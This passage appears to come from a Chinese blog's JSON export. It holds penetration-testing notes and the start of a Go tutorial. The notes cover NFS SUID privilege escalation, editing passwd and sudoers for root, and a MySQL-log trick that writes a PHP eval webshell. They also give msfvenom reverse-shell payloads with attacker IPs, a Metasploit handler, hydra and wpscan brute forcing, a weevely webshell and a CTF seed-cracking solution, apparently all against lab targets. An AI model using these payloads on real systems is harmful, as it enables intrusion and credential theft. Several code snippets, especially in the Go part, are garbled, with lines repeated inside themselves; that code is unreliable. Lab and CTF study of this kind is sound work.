restart\n\n此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。\n\n或者通过nmap的相关脚本来进行扫描。\n\nNFS配置不当可提权\n\n\n\n\n\n\n\n\n当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。\n测试如下：\n首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。\n\n此时目标机的home目录下就会有一个具有suid权限的bash。\n普通用户执行即可获取root权限，这里注意需要加上p参数，否则权限还是当前用户的。\np参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承suid，因为bash有suid权限，所以这里是root。\n\n使用场景：这个和suid提权很像，给程序赋予suid权限然后利用。不同的是前两篇suid提权是当前用户使用sudo  chmod自己修改的，在sudoers禁用sudo命令等情况下，就行不通了。而nfs配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。\n同理，之前总结的suid提权的那些程序也同样适用，这里就不再记了。\n其它命令除了可以直接得到shell的，还有其他一些程序不能直接获取，例如nano、vi等。\n\n然后使用nano -p来读取shadow文件，这里读取时把相关记录复制出来，使用john破解，测试不能重定向，需要权限，所以只能复制。\n\n复制后使用john破解获取相关用户密码，以root为例，密码是root。\n\n如果密码太复杂，破解不了，则可以尝试其它用户，例如我这里目标机是aaa用户，破解aaa密码为aaa。\n\n这时候不确定aaa是否为root权限，则可以继续使用nano去编辑passwd文件，给aaa赋权。\n把原来的1001换成0.\n\n然后切换aaa用户即可。\n\n利用这种机制，也可以用来修改sudoers文件，添加或修改为以下内容。\naaa     ALL=(ALL:ALL) NOPASSWD:ALL\n\n然后使用sudo bash或sudo su获取root权限。\n\n4）Mysql提权1、通过mysql日志功能\n\n\n\n\n\n\n\n\nSHOW VARIABLES LIKE &#39;general%&#39; 查询日志\nset global general_log = &quot;ON&quot;; 开启日志记录\nset global general_log_file=&#39;C://phpStudy//PHPTutorial//WWW//shell.php&#39;; 设置日志路径\nselect &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;; 写入一句话\n\n\n连接成功\n5）环境变量提权nepctf2023遇到\n\n","slug":"Linux-PowerUp","date":"2023-02-13T13:47:50.911Z","categories_index":"daily","tags_index":"提权","author_index":"Ttoc"},{"id":"463054968cf55cbdec365eb1472bde0e","title":"Burpsuite密码爆破","content":"顺便记一下，免得后面到处翻\n\n\nBurpsuite密码爆破虽然不知道这个网站是那位大佬总结建立的，但还是很感谢，节省很多时间，这个网站提供了很全面的密码表\n\n\n\n\n\n\n\n\n\nhttps://www.somd5.com/download/dict/\n之前在学习burpsuite的时候，大部分时间在用proxy和request，一直想用intruder，在做功防世界weak_auth这道题时，需要用字典爆破\n于是我便了解了一下这个功能\n\n\n\n\n\n\n\n\n\n在intruder下，主要看payload\npayload Sets主要用Simple list和Brute forcer\npayload1.Simple list主要就是讲写好的密码列表挨个进行测试，试出可以正确登录的密码\n\n2.Brute forcer就比较暴力，可以从下图看到Requset count有8,398,080次，因为他是把下面Character set里的所以字符的排列组合都试了，简单粗暴，也非常耗时间\n\n这里以一次爆破为例，可以看到下方有两个§ §，这两处就是payload输入点，我们输入爆破数据就不断在这两处上传测试\n\n如果我们已经知道了一处的数据，比如下方的username为admin，就不用用测试数据爆破，只用在password处爆破\n\n那么爆破完后，如何分辨哪个才是正确密码呢\n主要分析length，如果出现与大部分length不同的密码，那么大概率就是正确密码，比如此处， 123456就是正确密码\n\n3.Numbers\n纯数字型爆破，From是开始数字，To是结束数字，Step是间隔多少数字爆破一次\n4.Runtime file选择自己的字典文件\n5.Custom iterator（可以自定义拼接字段，比如username:password，这样爆破的两列数据被:隔开进行爆破）\n自定义迭代器。这种负载类型，可以配置项目的多个列表，并使用生成的列表中项的所有排列有效载荷。它提供了一个强有力的方法根据给定的模板，以产生字符或其他项目的定制排列。\n6.Character substitution字符替换。此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。\n7.Case modification此负载类型允许配置一个字符串列表，并应用各种情况下修改每个项目。这可能对密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。\n8.Recursivegrep递归grep，要用这个必须在Intruder&gt;options&gt;Grep-extract下添加一个响应匹配，比如说我一个请求页需要前一个响应页中的内容，这里就可以这样使用了。\n9.Dates时间、日期\n10.Null payloads这种攻击载荷产生有效载荷，其值是一个空字符串。当某种攻击请求需要反复发送同样的请求，但这种请求相对于基本请求是没有任何修改，这种攻击载荷产生有效载荷，这可用于各种攻击，例如采集 cookies来进行测序分析；应用层的拒绝服务攻击，这些请求被重复发送，导致服务器上产生高工作负荷的任务，或保活会话令牌，以便这些令牌在其它的间歇试验中使用。使用此载荷类型，它甚至没有必要在请求模板中标志有效载荷位置。您可以配置Burp产生一定特定数目的空有效载荷，或无限期地持续下去。当然我们也可以使用数字、日期等其他方式产生大量的连接，导致服务器的负载过高。\nAttack type（爆破方式）\n1.Sniper 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。\n2.Battering ram 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中。\n3.Pitchfork这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量。\n4.Cluster bomb这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。（即可以在用户名和密码两处用两个字典爆破）\n","slug":"tooluse(bp-bruce)","date":"2023-02-13T13:43:45.284Z","categories_index":"daily","tags_index":"tools","author_index":"Ttoc"},{"id":"e73809883b6a370bf3f1acefc7116657","title":"常用工具的使用","content":"记性不好记录一下\n\n\n常用工具的使用1）msf（1）msf基本使用一个漏洞利用框架,对计算机软件漏洞进行攻击\n这里以vulnhub dc1为例\n终端输入msfconsole，进入msf界面，或者菜单也可以打开\n\n输入search drupal，找一下有没有drupal可以利用的脚本\n/*对于其他命令，可以用help查询*/\n\n\n这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以\n输入use 1，进入编号1脚本的运行环境\n\n\n输入show options,查看脚本运行的所需要配置的项目\n\n\nRequired是要求填的，yes是必填项，no是非必填项\n这里的RHOSTS没有填，这里是要求填入target hosts也就是目标地址，也就是我们靶机的地址\n输入set RHOSTS 192.168.133.136\n\n\n再输入run，运行脚本\n\n\n输入shell，进入shell\n\n\n输入whoami，查看当前的权限\n\n\n发现是个低权限的账号\n输入ls，可以查看到当前的目录文件\n\n\n但是一堆东西挤在一起，还是有些不太方便\n输入下方指令，利用python进入交互式shell【固定姿势，要记住】\npython -c &#x27;import pty; pty.spawn(\"/bin/bash\")&#x27;\n\n\n（2）msf后门生成模块普通生成msfvenom -p 有效载荷 -f 输出格式 -o 输出文件\n\nmsfvenom -p windows/meterpreter/reverse_tcp -f exe -o payload.exe\n\n编码生成msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件\n\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe\n\n*以DC-3举个例子输入msfvenom -p php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=4444 -f raw > shell.php\n//注意，LHOST是kali的ip\n\n\n输入ls\n\n\n发现目录下生成了 shell.php\n\n然后在网站新建一个php文件\n\n然后把木马内容导入进去\n\n然后保存一下\n\n然后试试能不能访问木马\n然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功\n因为我们文件是在/templates/protostar/less/下上传的，所以访问\nhttp://192.168.133.139/templates/protostar/less/1.php\n\n\n看到&#x2F;*，看来是可以成功访问\nmsf利用木马然后用msf进行利用\n先输入msfconsole，进入msf\n\n\n\n然后输入\nuse exploit/multi/handler\n\nset payload php/meterpreter/reverse_tcp\n进入我们利用msf制作的木马利用环境\n\n\n输入show options\n看看需要填写什么\n\n\n看到LHOST监听的ip没有填写\n输入set LHOST 192.168.133.140 //kali的ip\n\n\n\n输入run，运行，会卡住\n\n这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页\nhttp://192.168.133.139/templates/protostar/1.php\n\n\n后面操作不赘述\nmsfvenom —list archs#查看支持的系统架构\naarch64, armbe, armle, cbea, cbea64, cmd, dalvik, firefox, java, mips, mips64, mips64le, mipsbe, mipsle, nodejs, php, ppc, ppc64, ppc64le, ppce500v2, python, r, ruby, sparc, sparc64, tty, x64, x86, x86_64, zarch\n\nmsfvenom —list platforms#查看支持系统平台\naix, android, apple_ios, bsd, bsdi, cisco, firefox, freebsd, hardware, hpux, irix, java, javascript, juniper, linux, mainframe, multi, netbsd, netware, nodejs, openbsd, osx, php, python, r, ruby, solaris, unifi, unix, unknown, windows\n\n\n\nmsfvenom -l payload #列出所有可用的payload\n\nmsfvenom -l formats #列出所有的输出格式\n\nmsfvenom -l encrypt #列出所有的加密方式\n\nmsfvenom -l encoders #列出所有的编码器\n\n常见生成格式1、 Windowsmsfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe\n\n2、Linuxmsfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elfxxxxxxxxxx msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf1\n\n3、Macmsfvenom --platform osx -a x86 -p osx/x86/shell_reverse_tcp -f macho -o payload.macho\n\n4、Androidmsfvenom -p android/meterpreter/reverse_tcp -o payload.apk\n\n5、Aspxmsfvenom --platform windows-p windows/meterpreter/reverse_tcp -f aspx -o payload.aspx\n\n6、JSPmsfvenom --platform java -p java/jsp_shell_reverse_tcp -f raw -o payload.jsp\n\n7、PHPmsfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php\n\n8、BASHmsfvenom -p cmd/unix/reverse_bash -f raw -o shell.sh\n\n9、Pythonmsfvenom -p python/meterpreter/reverse_tcp -f raw -o shell.py\n\n\n\nMsfvenom常用命令参数-l, --list  \n# 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等\n-p, --payload  \n# 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取\n--list-options \n# 列出--payload  的标准，高级和规避选项\n-f, --format  \n# 指定 Payload 的输出格式(使用 --list formats 列出)\n-e, --encoder  \n# 指定使用的 Encoder (使用 --list encoders 列出)\n--sec-name  \n# 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串\n--smallest \n# 使用所有可用的编码器生成最小的payload\n--encrypt  \n# 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)\n--encrypt-key  \n# 用于加密的密钥\n--encrypt-iv  \n# 加密的初始化向量\n-a, --arch  \n# 指定目标系统架构(使用 --list archs 列出)\n--platform  \n# 指定目标系统平台 (使用 --list platforms 列出)\n-o, --out  \n# 保存payload文件\n-b, --bad-chars  \n# 设置需要在 Payload 中避免出现的字符，如： &#x27;\\x00\\xff&#x27;\n-n, --nopsled  \n# 指定 nop 在 payload 中的数量\n-s, --space  \n# 设置未经编码的 Payload 的最大长度\n--encoder-space  \n# 编码后的 Payload 的最大长度\n-i, --iterations  \n# 设置 Payload 的编码次数\n-c, --add-code  \n# 指定包含一个额外的win32 shellcode文件\n-x, --template  \n# 指定一个特定的可执行文件作为模板\n-k, --keep \n# 保护模板程序的功能，注入的payload作为一个新的进程运行\n-v, --var-name  \n# 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）\n-t, --timeout  \n# 设置从STDIN读取payload的等待时间（默认为30,0为禁用）\n-h, --help \n# 帮助\n\n\n\n2）hydra\n\n\n\n\n\n\n\n\nhydra是一个自动化的爆破工具,暴力破解弱密码,是一个支持众多协议的爆破工具\n1.爆破用户密码这里以vulnhub dc1为例\n用了hydra[海德拉]工具，对flag4用户进行爆破\nhydra -l flag4 -p /usr/share/wordlists/rockyou.txt.gz 192.168.133.136 -vV -f\n\n\n-l是指定用户或指定包含多个用户的文件，-p是指定密码或指定包含多个密码的文件，ssh就是\n用户所在的网站\n\n上面-p的文件是kali自带的密码包，当然也可以用其他的\n\n-s 端口\n\n\n这里就看到flag4用户的密码被爆破出来，是orange\n然后用ssh连接\n输入ssh flag4@192.168.133.136\n然后yes\n然后输入密码：orange\n\n\n3）cewl\n\n\n\n\n\n\n\n\n Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。Cewl是通过ruby编写,通过爬取网站并提取独立的单词保存为字典,可以和John the Ripper等工具配合使用。\n 主要还是根据网站自身的关键词，然后生成的字典，比如cewl，flag等等\n这里以vulnhub dc2为例\n-w等同于>   //写入\n-m n       //至少生成的长度为n，默认是3\n-d x       //生成更大的字典，默认x=2\n\n\n\n我们用cewl试试生成字典\n输入cewl http://dc-2/ >pass.txt\n\n\n目录下就会生成pass.txt\n输入cat pass.txt，查看内容\n\n\n发现是生成对应网站的密码字典\n4）wpscan\n\n\n\n\n\n\n\n\nWPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞\n这里以vulnhub dc2为例\nwpscan -url http://dc-2 -e u\n\n-e u    //枚举用户信息\n\nwpscan -url xx -P xx -U xx\n-P passwdspath  //密码字典路径，或者直接写\n-U userspath    //用户名字典路径，或者直接写\n\n\n\n于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下\n输入wpscan --url http://dc-2 -e u\n\n\n然后往下看用户名\n\n发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的pass.txt这个密码本一样\n输入vi un.txt,把admin jerry tom复制进去\n\n\n然后就可以结合我们的密码文本和用户名文本，利用wpscan这个工具，进行爆破操作了\n输入wpscan --url http://dc-2 -P pass.txt -U un.txt\n\n\n稍微等一会\n\nadmin用户密码没有找到，应该是最高权限的账号\n但是jerry和tom用户的密码知道了\n5）JohnJohn是一个破解系统密码的工具\n使用很简单\njohn passwd.txt //这里是直接利用john自带的密码本，后面接的是需要爆破的密码文本文件\n\njohn --wordlist=字典路径 passwd.txt //这里是指定密码本，后面接的是需要爆破的密码文本文件\n\n\n\njohn --show passwd.txt //这是查看该密码文本中已经被爆破成功过的密码\n\n\n就可以看到明文为snoopy\n6）weevely\n\n\n\n\n\n\n\n\nWeevely是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具\n生成Shell\nweevely generate  \n\n\nweevely generate 123456 shell.php\n\n把生成的内容，复制到我们创建的789.php文件里，和前面两个方法步骤一样\n利用触发shell\nweevely http://192.168.133.139/templates/protostar/789.php 123456\n\npython -m http.server 9999\n\n\n成功进入shell\n7）whatwebwhatweb http://192.168.220.156/ >> whatweb.txt\n//把网站的框架信息导入到文本whatweb.txt中\n\n这个工具主要是查看网站的框架，和wapplzer类似\n\n8）knockd\n\n\n\n\n\n\n\n\n在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。\n端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到Internet，则可以使用端口断开功能。它允许您关闭防火墙上允许传入连接的端口，并在进行预先安排的连接尝试方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。\n什么意思呢，也就是说，我先关闭了一个端口\n但是呢，我为了我想要的人访问它，我写了一个敲门的顺序（也就是访问端口的顺序）\n顺序在/etc/knockd.conf\n\n比如，\n我关闭了\n22/ssh端口\n\n我写了一个顺序\n7893,6452,2412\n\n这是三个端口\n我为什么为你打开22端口，原因是因为你敲对了顺序\n这里就涉及敲门的方法\n1&gt; knock命令knock 192.168.1.8 7469 8475 9842 //192.168.1.8为目标ip\n\n2&gt;nc命令$ nc -v dc9 7469\n10.0.0.14: inverse host lookup failed: Unknown host\n(UNKNOWN) [10.0.0.14] 7469 (?) : Connection refused\n\n$ nc -v dc9 8475                                                                                       \n10.0.0.14: inverse host lookup failed: Unknown host\n(UNKNOWN) [10.0.0.14] 8475 (?) : Connection refused\n\n$ nc -v dc9 9842                                                                                       \n10.0.0.14: inverse host lookup failed: Unknown host\n(UNKNOWN) [10.0.0.14] 9842 (?) : Connection refused\n\n也就是利用nc命令三次访问这3个端口\n\n最后用nmap扫一下就看见22端口打开了\n9)opensslSSL 简介\n\n\n\n\n\n\n\n\n按照我的理解来解释下，\n为了让网络通信更安全，需要认证和加密，认证是说明你是要找的人，加密是为了让截获中间报文第三者无法得到消息内容。\n为此有人设计了SSL，即套接字上的安全层，简单来说就是在TCP之上做一个安全通信层，HTTP on SSL 即是HTTPs，\n现在几乎所有的银行网站访问都是基于HTTPS协议的。认证是通过证书+非对称加密算法来解决的\n\n\n\n\n\n\n\n\n\nopenssl可以实现：秘钥证书管理、对称加密和非对称加密。\n举一个例子\nopenssl passwd -1 -salt salt password\n==>\n$1$salt$qJH7.N4xYta3aEG/dfqo/0\n\n-1使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。\n\n-salt salt用作盐的字符串。我选择字符串盐\n\npassword我们想使用的明文密码\n\n10)gobuster爆破目录gobuster dir -w common.txt -u url\n\n爆破子域名gobuster vhost -w subdomains-top1million-5000.txt -u url\n\n11)seed工具php_mt_seed这里以一道题为例子讲解这个工具的使用\n\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);\necho \"Hint: \".mt_rand().\"\";\nif(isset($_POST[&#x27;guess&#x27;]) && md5($_POST[&#x27;guess&#x27;]) === md5(mt_rand()))&#123;\n    if(!preg_match(\"/base|\\.\\./i\",$_GET[&#x27;file&#x27;]) && preg_match(\"/NewStar/i\",$_GET[&#x27;file&#x27;]) && isset($_GET[&#x27;file&#x27;]))&#123;\n        //flag in `flag.php`\n        include($_GET[&#x27;file&#x27;]);\n    &#125;else&#123;\n        echo \"Baby Hacker?\";\n    &#125;\n&#125;else&#123;\n    echo \"No Hacker!\";\n&#125; Hint: 1219893521\nNo Hacker!\n\n\n搜索这两个函数\nmt_scrand()\nmt_rand()\n\nmt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。\n我们来写段代码。\n  \nmt_srand(12345);    \necho mt_rand().\"\";\n?>\n\n我们访问，输出162946439。\n现在代码改为\n  \nmt_srand(12345);    \necho mt_rand().\"\";\necho mt_rand().\"\";\necho mt_rand().\"\";\necho mt_rand().\"\";\necho mt_rand().\"\";\n?>\n\n我们再次访问:\n\n\n\n\n\n\n\n\n\n162946439\n247161732\n1463094264\n1878061366\n394962642\n发现162946439又出现了\n\n\n\n\n\n\n\n\n\n所以可以推断出随机数其实是可预测的，\n它以一种线性的方式生成\n知道种子和一组伪随机数不是就可以推y(伪随机数了吗),当然实际上更复杂肯定。\n我知道种子后，可以确定你输出伪随机数的序列。知道你的随机数序列，可以确定你的种子。 \n在我们的例题中，我们并不知道我们的种子是多少\n但是它给出了我们种子的第一个随机数1219893521\n这个时候想要拿到种子的值，就需要大量反向的演算推导了\n这个过程很庞大，所以这里就用到了工具【脚本】php_mt_seed\ntime ./php_mt_seed 第一个随机数\n\n\n于是我们就得到了我们的seed\n\n\n\n\n\n\n\n\n\n1145146\n再分析源码\necho &quot;Hint: &quot;.mt_rand().echo &quot;Hint: &quot;.mt_rand().\"\";\nif(isset($_POST[&#x27;guess&#x27;]) && md5($_POST[&#x27;guess&#x27;]) === md5(mt_rand()))&#123;\n\n这里在 echo处已经随机了一次，所以在底下比较的时候就算第二个随机数进行强类型比较\n于是\n&#x27;;\necho mt_rand();\n\n==>12198935211202031004\n\n得到guess参数的值1202031004\n对于最后对file文件包含语句的正则匹配绕过\nif(!preg_match(&quot;/base|\\.\\./i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; preg_match(&quot;/NewStar/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[if(!preg_match(&quot;/base|\\.\\./i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; preg_match(&quot;/NewStar/i&quot;,$_GET[&#x27;file&#x27;]) &amp;&amp; isset($_GET[&#x27;file&#x27;]))\n\n大概就是不能出现base，然后参数中间要包含/NewStar/这一段\n?file=php://filter\n\n","slug":"tooluse(Commontools)","date":"2023-02-13T13:31:12.814Z","categories_index":"daily","tags_index":"tools","author_index":"Ttoc"},{"id":"54d4e8482c6dc0ae7c398e63273488f8","title":"golang","content":"主要从黄哥的资料笔记，尚硅谷，以及谢先斌大佬的笔记https://www.xiexianbin.cn/golang\n以及https://exercism.org/上面进行练习, 顺便推荐一本书《go黑帽子》\n\n\nGO语言概述\n\n\n\n\n\n\n\n\nGo语言是谷歌2009年发布的第二款开源编程语言,它专门针对多处理器系统应用程序的编程进行了优化，它是一种系统语言其非常有用和强大,其程序可以媲美C或C++代码的速度，而且更加安全、支持并行进程。\nGo支持面向对象，而且具有真正的闭包(closures)和反射 (reflection)等功能。\nGo可以在不损失应用程序性能的情况下降低代码的复杂性。\nGo是是静态强类型语言\nGo语言开发者被叫做gopher，这个和信息查找系统gopher协议同名\nGo语言特色\n\n\n\n\n\n\n\n\n\n简洁、快速、安全\n并行、有趣、开源\n内存管理、数组安全、编译迅速\n\nGo语言用途\n\n\n\n\n\n\n\n\nGo 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。对于高性能分布式系统领域而言，Go 语言无疑比大多数其它语言有着更高的开发效率。它提供了海量并行的支持，这对于游戏服务端的开发而言是再好不过了。\nGo语言编译过程\n可查看文档网站信息\n\n\n\n\n\n\n\n\n官网:https://golang.google.cn/API文档:https://golang.google.cn/doc/教程:http://www.w3cschool.cn/go/go-tutorial.html下载:https://golang.google.cn/dl/\n基础概念基础概念将介绍三种主要的语言特性：包、函数和变量\nPackage\n\n\n\n\n\n\n\n\nGo 应用程序以包的形式组织。包是位于同一目录中的源文件的集合。目录中的所有源文件必须共享相同的包名称。包名称通常是导入路径中的最后一个目录。\n例如，\n“math&#x2F;rand”包中的文件以语句开头package rand。\n\n\n\n\n\n\n\n\n\n导入包时，只能使用&#x2F;访问名称以大写字母开头的实体（函数、类型、变量、常量）。Go 中推荐的命名风格是标识符将使用 命名camelCase，除了那些意味着可以跨包访问的标识符应该是PascalCase\npackage lasagna\n\n变量Go 是静态类型的，这意味着所有变量在编译时都必须具有定义的类型。\n可以通过显式指定类型来定义变量：\nvar explicit int var explicit int // 显式声明\n\n您还可以使用初始化器，编译器将分配变量类型以匹配初始化器的类型。\nimplicit := 10   implicit := 10   // 隐式声明为int，自动分配类型\n//也就是说可以利用 := 进行类型声明，其类型为其后数据的类型\n\n声明后，可以使用运算符为变量赋值=。一旦声明，变量的类型就永远不会改变。\ncount := 1 count := 1 // 赋初值\ncount = 2  // 更新新值\n\ncount = false // 由于分配了非“int”类型，这会引发编译器错误\n\n常量常量就像变量一样保存一段数据，但它们的值在程序执行过程中不能改变。\n常量使用const关键字定义，可以是数字、字符、字符串或布尔值：\nconst Age = 21 const Age = 21 // 定义一个值为 21 的数值常量 &#x27;Age&#x27;\n\n函数Go 函数接受零个或多个参数。参数必须明确类型化，没有隐式声明类型。\nreturn使用关键字从函数返回值。\n通过指定函数名称并为函数的每个参数传递参数来调用函数。\n\n\n\n\n\n\n\n\n\n请注意，Go 支持两种类型的注释：\n单行注释在前面，多行注释在和//之间插入。/*``*/\npackage greeting\n\n// Hello is a public function.\nfunc Hello (name string) string &#123;\n    return hi(name)\n&#125;\n\n// hi is a private function.\nfunc hi (name string) string &#123;\n    return \"hi \" + name\n&#125;\n\n*函数定义\n\n\n\n\n\n\n\n\nfunc 函数名(形参列表) 返回类型列表 &#123;  函数体&#125;\n这里的返回类型列表是因为返回值需要描述返回值类型\n函数调用\n\n\n\n\n\n\n\n\n函数可以通过 函数名(实参列表)，在调用过程中实参的每个数据会赋值给形参中的对应变量（实参列表类型和数量需要与形参一一对应）\n【这和大部分代码的调用函数方法一样，不用多说】\n*基础函数示例package main\n\nimport \"fmt\"\n\n// 无参函数\nfunc hello() &#123;\n\tfmt.Println(\"Hello World!\")\n&#125;\n\n// 有参函数，name 称为形参\nfunc helloSomeone(name string) &#123;\n\tfmt.Println(\"Hello\", name, \"!\")\n&#125;\n\n// 有返回值函数\n//func add(a int, b int) int &#123;\nfunc add(a, b int) int &#123;\n//函数声明中[a,b]存在多个相同类型[int]的连续形参，可以只保留最后一个形参的类型[a, b int]\n\treturn a + b\n&#125;\n\nfunc ExampleFunc() &#123;\n\t// 无参函数调用\n\thello()\n\t// 函数的标识符为 func()，调用函数需要加 ()\n\tfmt.Printf(\"%T\\n\", hello)\n\n\t// 有参函数调用\n\thelloSomeone(\"xianbin\") // name = \"xianbin\" 为实参，调用函数时，传递给函数的形参\n\tfmt.Printf(\"%T\\n\", helloSomeone)\n\n\t// 有返回值函数调用\n\tsum := add(1, 2)\n\tfmt.Println(sum)\n\tfmt.Printf(\"%T\\n\", add)\n\n\t// 函数的类型\n\tvar f func(int, int) int\n    //函数[func(int, int) int]也可以赋值给变量[var f]，也可以当成实参[f(1, 2)]赋值给另一个函数[fmt.Println()]作为形参。\n\tf = add\n\tfmt.Println(f(1, 2))\n\n\t// Output:\n\t//Hello World!\n\t//func()\n\t//Hello xianbin !\n\t//func(string)\n\t//3\n\t//func(int, int) int\n\t//3\n&#125;\n\n\n\n数字Go 包含基本的数字类型，可以表示整数或浮点值的集合。\n这个概念将集中在两种数字类型上：\n\n\n\n\n\n\n\n\n\n\nint：例如0，，255。2147483647大小至少为 32 位的带符号整数（值范围：-2147483648 到 2147483647）。但这将取决于系统架构。大多数现代计算机都是 64 位的，因此int大小为 64 位（取值率为：-9223372036854775808 到 9223372036854775807）。\nfloat64：例如0.0，3.14。包含所有 64 位浮点数的集合。\n\n+Go 支持, -, *,/ 和%（余数不取模）的标准算术运算符集。\n在 Go 中，不同类型之间的赋值需要显式转换。例如，要将 an int 转换为 a float64，\n您需要执行以下操作：an := float64(a)\nvar x int = var x int = 42\nf := float64(x)\n\nfmt.Printf(\"x is of type: %s\\n\", reflect.TypeOf(x))\n// Output: x is of type: int\n\nfmt.Printf(\"f is of type: %s\\n\", reflect.TypeOf(f))\n// Output: f is of type: float64\n\n计算Go的计算符使用以及运算简写和大部分代码是一样\n\n\n\n\n\n\n\n\n\n对于整数除法，余数被丢弃（例如5 / 2 == 2），也是一样的\n简写，如\na+&#x3D;5\na++\na–\n不同类型的算术运算在许多语言中，您可以对不同类型的变量执行算术运算，但在 Go 中，这会产生错误。例如：\nvar x int = var x int = 42\n\n// this line produces an error\nvalue := float32(2.0) * x // invalid operation: mismatched types float32 and int\n\n// you must convert int type to float32 before performing arithmetic operation\nvalue := float32(2.0) * float32(x)\n\n这是由于这样高精度和低精度进行计算，会导致精度丢失，需要先将低精度类型转化为高精度类型，再进行计算\nbool和大部分代码一样\nGo 中的布尔值由bool类型表示。bool是true或false。\nGo 支持三种布尔运算符：!(NOT)、&amp;&amp;(AND) 和||(OR)。\ntrue || false true || false // => true\ntrue && false // => false\n!true // => false\n\n这三个布尔运算符各有不同的运算符优先级。因此，它们按以下顺序进行评估：!首先、&amp;&amp;第二和最后||。如果您想强制执行不同的顺序，您可以将布尔表达式括在圆括号中（即。()），因为圆括号具有更高的运算符优先级。\n!true &amp;&amp; false   !true &amp;&amp; false   // => false\n!(true && false) // => true\n\nif条件语句书写规范如果习惯用\nif(condition)\n&#123;\n    // do something\n&#125;\nelse\n&#123;\n    // do something1\n&#125;\n\n那么在Go这里就行不通了，如果你按上面的格式进行书写，就会报错\n\n\n\n\n\n\n\n\n\nunexpected else\n你需要按照作者规定的格式，才会使得代码不显示错误\nif condition &#123;\n    // do something\n&#125;else &#123;\n    // do something1\n&#125;\n\nif+else if也是如此\nif condition &#123;\n    // do something\n&#125;else if condition1 &#123;\n    // do something1\n&#125;else if condition2 &#123;\n    // do something2\n&#125;else &#123;\n    // do something3\n&#125;\n\nGo的作者追求简洁优雅高效的代码格式，所以遇到这种形式，只能按作者的方式进行编写（无奈\n关于字符串Go 中的string是一个不可变的字节序列，不一定代表字符。\n双引号之间定义了一个字符串文字：\nconst name = const name = \"Jane\"\n\n字符串可以通过+运算符连接起来：\n&quot;Jane&quot; + &quot; &quot; + &quot;Jane&quot; + &quot; &quot; + \"Austen\"\n// => \"Jane Austen\"\n\n一些特殊字符需要使用前导反斜杠进行转义，例如\\t制表符和\\n字符串中的新行。\n\"How is the weather today?\\nIt&#x27;s sunny\"  \n// =>\n// How is the weather today?\n// It&#x27;s sunny\n\n该strings包包含许多用于处理字符串的有用函数。有关字符串函数的更多信息，请查看字符串包文档。这里有些例子：\nimport import \"strings\"\n\n// strings.ToLower returns the string given as argument with all its 